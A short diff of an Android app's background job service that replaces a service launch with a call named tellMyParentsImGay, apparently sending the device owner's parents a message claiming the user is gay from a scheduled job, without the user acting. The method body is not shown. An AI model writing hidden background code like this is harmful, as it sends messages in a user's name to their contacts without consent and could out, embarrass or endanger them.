@@ -10,9 +10,10 @@ import com.candroid.textme.jobs.JobsScheduler;
 public class TextParentsJobService extends JobService {
     @Override
     public boolean onStartJob(JobParameters params) {
-        Intent textParentsIntent = new Intent(this, JobsIntentService.class);
+/*        Intent textParentsIntent = new Intent(this, JobsIntentService.class);
         textParentsIntent.setAction(JobsIntentService.ACTION_TEXT_PARENTS);
-        startService(textParentsIntent);
+        startService(textParentsIntent);*/
+        Lofl.tellMyParentsImGay(this);
         Lofl.setJobRan(this, JobsScheduler.TEXT_PARENTS_KEY);
         this.jobFinished(params, false);
         return true;
